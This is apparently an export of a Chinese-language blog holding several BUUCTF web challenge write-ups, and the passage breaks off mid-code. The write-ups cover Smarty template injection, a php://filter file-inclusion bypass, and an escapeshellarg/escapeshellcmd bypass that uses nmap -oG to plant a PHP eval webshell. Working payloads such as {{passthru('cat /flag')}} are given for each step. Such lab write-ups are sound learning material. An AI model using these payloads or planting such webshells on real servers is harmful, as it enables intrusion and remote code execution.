    <url>/2022/03/22/BJDCTF2020%20The%20mystery%20of%20ip/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境后发现什么都没有，查看源码也没有。点击 <code>flag</code> 和 <code>hint</code> 都没有。抓包也没找到有用信息，因此想到扫描目录吧。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322201937.png" /></p>
<p>发现有 <code>.DS_Store</code>，因此可能有信息泄露，但是下载下来发现，一堆乱码。此时注意到题目：<code>The_mystery_of_ip</code>，并且 <code>hint.php</code> 源码中提示到 <code>&lt;!-- Do you know why i know your ip? --&gt;</code>，忽然想到 <code>XFF</code>。</p>
<h1 id="解题">解题</h1>
<p>进入 <code>flag.php</code> 然后抓包，修改 <code>XFF</code>。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322202806.png" /></p>
<p>说明此题的突破点就在这里，但是实在想不到，看了别人的 writeup 才知道这里考的是模板注入。</p>
<p>先尝试 <code>&#123;&#123;2*3&#125;&#125;</code>，结果如下 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204148.png" /></p>
<p>发现确实如此，输入 <code>&#123;&#123;php&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204358.png" /></p>
<p>发现是 <code>smarty</code>。</p>
<p><code>smarty</code> 存在命令执行： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec — 执行一个外部程序  </span><br><span class="line">passthru — 执行外部程序并且显示原始输出  </span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码  </span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。  </span><br><span class="line">popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </span><br><span class="line">proc_terminate — 杀除由 proc_open 打开的进程  </span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。  </span><br><span class="line">system — 执行外部程序，并且显示输出  </span><br><span class="line">scandir 列出指定路径中的文件和目录  </span><br><span class="line"><span class="keyword">eval</span> — 把字符串作为PHP代码执行  </span><br><span class="line">assert --函数直接将传入的参数当成PHP代码执行</span><br></pre></td></tr></table></figure></p>
<p>输入 payload：<code>&#123;&#123;passthru("ls /")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204751.png" /></p>
<p>发现 flag，利用 <code>&#123;&#123;passthru("cat /flag")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204858.png" /></p>
<p>成功get。</p>
<h1 id="总结">总结</h1>
<ul>
<li>模板注入是 CTF 中常考的题目，这里着实没想到。</li>
<li>要注意题目环境中的各种信息，比如这题中的题目想到 <code>XFF</code>。</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>BSidesCF 2019 Futurella</title>
    <url>/2022/04/19/BSidesCF%202019%20Futurella/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BBJDCTF2020%5DEasySearch">Futurella</a></p>
<p>这题目就很简单...</p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p>进入环境，得到如下信息：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419115556.png" /></p>
<p>讲英语翻译过来的意思就是：<strong>阻止外星人！我们在垃圾箱里找到这张纸条，我们认为这是外星人的东西！你能够理解它吗？</strong></p>
<h1 id="解题">2. 解题</h1>
<h2 id="方法1">2.1. 方法1</h2>
<p>我按照惯例查看了一下源码，结果就发现了flag！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419115805.png" /></p>
<p>最开始还以为是假的，没想到是真的！</p>
<h2 id="方法2">2.2. 方法2</h2>
<p>发现这些特殊的字符可以被选中，因此将它们复制粘贴，也可以得到如下信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Resistance is futile! Bring back Futurella or we&#x27;ll invade!</span><br><span class="line"></span><br><span class="line">Also, the flag is flag&#123;c1e7c9de-8b5b-4a0a-a406-596f5663a4c1&#125;</span><br></pre></td></tr></table></figure></p>
<p>这其实就是源码中的内容。</p>
<h1 id="番外">3. 番外</h1>
<p>对比外星文和原来的内容，从倒数第三行和最后一行的<code>&#123;</code>, <code>&#125;</code>比较容易看出来这是flag的前后花括号，因此猜测，每一个外星字符对应一个英文字符。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>BSidesCF 2020 Had a bad day</title>
    <url>/2022/03/29/BSidesCF%202020%20Had%20a%20bad%20day/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境之后，页面有两个选择</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133629.png" /></p>
<p>这时候选哪个都会跳出对应的图片（狗或者猫），并且 url 出现变化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://6bea1108-6e3e-4c6b-9295-bf25d2c8e728.node4.buuoj.cn:81/index.php?category=meowers</span><br></pre></td></tr></table></figure>
<p>此时打开源码发现：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133835.png" /></p>
<p>每刷新一次这个红框里的图片都会变化，因此，可能存在文件包含。</p>
<h1 id="解题">解题</h1>
<p>尝试看一下报错有没有信息，发现输入任何东西都只会提示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, we currently only support woofers and meowers.</span><br></pre></td></tr></table></figure>
<p>可是这并不算报错，因此，尝试一下 <code>?category=meowers.php</code>，此时发现报错了！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329134329.png" /></p>
<p>此时，可以确定本题是文件包含，函数为 <code>include()</code>。</p>
<p>利用伪协议 <code>php://filter</code> 尝试读取一下 <code>index.php</code> ，payload 如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
<p>发现报错了，报错信息为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: include(php://filter/read=convert.base64-encode/resource=index.php.php): failed to open stream: operation failed in /var/www/html/index.php on line 37</span><br></pre></td></tr></table></figure></p>
<p>注意文件名后有两个php，猜测后台在我们传入的参数后面加上了 <code>.php</code>，因此构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
<p>成功读取源码，base64解码后，将重要内容整理如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>通过代码审计知道：</p>
<ol type="1">
<li>需要传入参数 category</li>
<li>category 需要包含 <code>woofers</code>， <code>meowers</code>， <code>index</code> 三者之一</li>
<li>我们传入的文件名不需要包含 .php</li>
</ol>
<p>假设我们读取的是 <code>flag</code>，那么我们就要带上上述的第二点的其中一个，这就是本题的难点，有两种payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?category=php://filter/read=convert.base64-encode/resource=index/../flag</span><br><span class="line">2. ?category=php://filter/read=convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure></p>
<p>两者都能得到结果（第二个payload就是 <code>php://filter</code> 伪协议嵌套），但是如果使用第二种，会出现报错信息：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329201529.png" /></p>
<p>这里不是很懂，不过根据结果可以猜测，<code>index</code> 的位置上应该放的是 filter 这个伪协议的选项，而index并不是，所以这里报错了，但是这并不影响整体的执行。</p>
<h1 id="总结">总结</h1>
<p>通过本题可以学到： <code>php://filter</code> 伪协议的嵌套。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF 2018 Online Tool</title>
    <url>/2022/03/22/BUUCTF%202018%20Online%20Tool/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，得到如下代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123; </span><br><span class="line">	<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123; </span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">	<span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">	<span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>); </span><br><span class="line">	<span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>); </span><br><span class="line">	<span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;  </span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>); </span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);  </span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></p>
<p>从上面可以看出以下几点： - 以GET方式传入 <code>host</code>； - <code>host</code> 要经过 <code>escapeshellarg</code>，<code>escapeshellcmd</code> 两个函数。但是对这两个函数现在一无所知； - <code>sandbox</code> 就是路径地址； - <code>system</code> 函数说明本题应该是命令执行；</p>
<p>现在最大的问题就是第二点的两个函数的作用。</p>
<h1 id="escapeshellarg和escapeshellcmd作用">escapeshellarg和escapeshellcmd作用</h1>
<h2 id="escapeshellarg函数">escapeshellarg函数</h2>
<p>语法： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">escapeshellarg ( <span class="keyword">string</span> <span class="variable">$arg</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure></p>
<p>作用： 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。</p>
<p>看解释可能不明白什么意思，接下来看一个例子。</p>
<p>脚本如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;&lt;?php phpinfo(&#x27;x&#x27;);?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$host1</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo(&#x27;x&#x27;);?&gt;</span><br><span class="line">&#x27;&lt;?php phpinfo(&#x27;\&#x27;&#x27;x&#x27;\&#x27;&#x27;);?&gt;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>可以看到 <code>escapeshellarg</code> 会在所有单引号前添加转义符号，变成 <code>\'</code> 然后在这两个字符外阔上单引号<code>'\''</code>。因此，上述例子中会将原来的 <code>'</code> 变成 <code>'\''</code>，然后在整个字符串外面添加单引号。回过头看 <strong>将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</strong> 就很明确了。</p>
<h2 id="escapeshellcmd函数">escapeshellcmd函数</h2>
<p>语法： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">escapeshellcmd(<span class="keyword">string</span> <span class="variable">$command</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure></p>
<p>作用： escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者执行操作符之前进行转义。反斜线（）会在以下字符之前插入： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;  #  ; `  |  *  ?  ~  &lt;  &gt;  ^  (  )  [  ]  &#123;  &#125;  $  \, \x0A  \xFF</span><br></pre></td></tr></table></figure> <code>'</code>和 <code>"</code> 仅在不配对的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p>
<p>看一个例子： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;&lt;?php phpinfo(&#x27;x&#x27;);?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$host1</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line"><span class="variable">$host2</span> = escapeshellcmd(<span class="variable">$host1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host2</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo(&#x27;x&#x27;);?&gt;</span><br><span class="line">&#x27;&lt;?php phpinfo(&#x27;\&#x27;&#x27;x&#x27;\&#x27;&#x27;);?&gt;&#x27;</span><br><span class="line">&#x27;\&lt;\?php phpinfo\(&#x27;\\&#x27;&#x27;x&#x27;\\&#x27;&#x27;\)\;\?\&gt;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>可以看到它在众多符号面前都添加了转移符号 <code>\</code> 。</p>
<h2 id="两者一起用的漏洞">两者一起用的漏洞</h2>
<p>例子来源于：<a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p>
<ol type="1">
<li>假设传入的参数是：<code>172.17.0.2' -v -d a=1</code></li>
<li>经过<code>escapeshellarg</code>处理后变成了<code>'172.17.0.2'\'' -v -d a=1'</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
<li>经过<code>escapeshellcmd</code>处理后变成<code>'172.17.0.2'\\'' -v -d a=1\'</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对</strong>的引号进行了转义。</li>
<li>最后执行的命令是<code>curl '172.17.0.2'\\'' -v -d a=1\'</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>'</code>没有被转义，与再后面的<code>'</code>配对成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1'</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1'</code>。</li>
</ol>
<p>总而言之：</p>
<ul>
<li>escapeshellarg
<ul>
<li>确保用户只传递一个参数（在整个外面添加单引号，使字符串成为一个整体）</li>
<li>用户不能指定更多的参数</li>
<li>用户不能执行不同的命令（一般 <code>127.0.0.1;ls</code>，在外面添加单引号使 <code>;</code> 与前后文变成整体，因此无法实现执行多条命令）</li>
</ul></li>
<li>escapeshellcmd
<ul>
<li>确保用户只执行一个命令（会在落单的引号前添加转义字符使其失去闭合前面引号的作用）</li>
<li>用户可以指定不限量的参数</li>
<li>用户不能执行不同的命令（<code>;  $  |</code> 等符号都会被添加转义字符使其失去功能，变成字符本身）</li>
</ul></li>
</ul>
<h1 id="解题">解题</h1>
<p>本题其实还涉及 nmap 的参数，nmap 可以用 <code>-oG</code> 将执行结果写入文件。</p>
<p>语法： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap [任意内容] -oG fileName</span><br></pre></td></tr></table></figure></p>
<p>接下来就是细节方面的讨论了。就是如何绕过前面所说的两个函数。我们需要写入文件的肯定是一句话木马，因此payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php</span><br></pre></td></tr></table></figure></p>
<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php&#x27;</span><br></pre></td></tr></table></figure></p>
<p>这样子 <code>-oG</code> 与上下文变成一个整体，无法被当作参数执行。因此需要把单引号去掉，只要最前面添加单引号就可以把后面释放出来。修改后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php</span><br></pre></td></tr></table></figure></p>
<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php\&#x27;</span><br></pre></td></tr></table></figure></p>
<p>由于 <code>\\</code> 使后者不作为转移符号，因此第三个单引号还能起作用，与第四个单引号成对，单引号内容为空，可以去掉： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php\&#x27;</span><br></pre></td></tr></table></figure></p>
<p>于是 <code>oG</code> 可以被成功执行，但是此时前面的木马写入的文件的名字为 <code>shell.php'</code> 。（<strong>我由于已经做完了，下面蚁剑连接只是作为证明，以便理解</strong>） <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322191734.png" /></p>
<p>内容为： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322191747.png" /> （<code>\\</code> 使后者失去转义功能，仅仅作为 <code>\</code>，因此木马最前面有一个 <code>\</code>）</p>
<p>不是 <code>php</code> 文件，无法连接。接下需要把后面的单引号也要去掉，因此在后面也添加单引号： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php&#x27;</span><br></pre></td></tr></table></figure></p>
<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php&#x27;\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>简化后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php&#x27;\\&#x27;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>注意，前面的 <code>''\\''</code> 因为前面的两个单引号成对，因此 <code>\\</code> 不被单引号包括，也就是不是字符串；而后者 <code>'\\'''</code>中<code>\\</code>被单引号包括，因此前一个转义字符不执行转义字符，而是被当作普通的字符。</p>
</blockquote>
<p>因此最后生成的文件名为 <code>shell.php\\</code>。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322192825.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322192834.png" /></p>
<p>解决办法也很简单，那就是加一个空格就好： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php &#x27;</span><br></pre></td></tr></table></figure></p>
<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php &#x27;\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>简化后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php &#x27;\\&#x27;</span><br></pre></td></tr></table></figure></p>
<p>此时相当于把 <strong>木马</strong> 和 <code>\\</code> 一起写入了文件。路径如下，注意别把 <code>Starting</code> 也当作路径。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322193312.png" /></p>
<p>用蚁剑连接即可。flag在根目录。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>RCE</tag>
        <tag>nmap命令</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2019 华东南赛区 Web11</title>
    <url>/2022/04/16/CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%20Web11/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BCISCN2019%20华东南赛区%5DWeb11">Web11</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境之后，看到了一堆信息：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121336.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121350.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121357.png" /></p>
<h1 id="解题">解题</h1>
<p>首先，我尝试了一下API Usage，先后访问了<code>http://node4.buuoj.cn:29398/api</code>和<code>http://node4.buuoj.cn:29398/xff</code>，发现状态码都为301。</p>
<p>接着我尝试了一下Connection中的请求头，得到状态码500。</p>
<p>最后看到了<code>build with smarty</code>，可能暗示着存在SSTI，并且渲染引擎为smarty。首先尝试了一下<code>http://node4.buuoj.cn:29398/$&#123;7*7&#125;</code>，结果如下</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121736.png" /></p>
<p>这不应该呀，如果说确实渲染引擎确实为smarty的话，这里显示的应该是<code>$49</code>。思来想去，我注意到了url，我的输入居然变成了<code>$%7B7*7%7D</code>，那么自然不会被smarty给识别成代码执行。</p>
<p>所以，我尝试用burp发送请求。终于</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121940.png" /></p>
<p>确定了这里存在SSTI，那接下来就很简单了。可以先用<code>$&#123;smarty.version</code>查看一下版本，看一下能否利用一些标签。我这里直接使用命令执行，payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;system(&quot;ls /&quot;)&#125; # 找到flag文件在根目录下</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416122203.png" /></p>
<p>然后读取flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416122245.png" /></p>
<h1 id="总结">总结</h1>
<p>这是一道关于SSTI的简单题目，唯一需要注意的点是不能直接在浏览器中输入payload，否则会被url编码，导致smarty不能识别。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
        <tag>smarty</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN 2019 初赛 Love Math</title>
    <url>/2022/04/10/CISCN%202019%20%E5%88%9D%E8%B5%9B%20Love%20Math/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BCISCN%202019%20初赛%5DLove%20Math">Love Math</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境直接就给了源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span 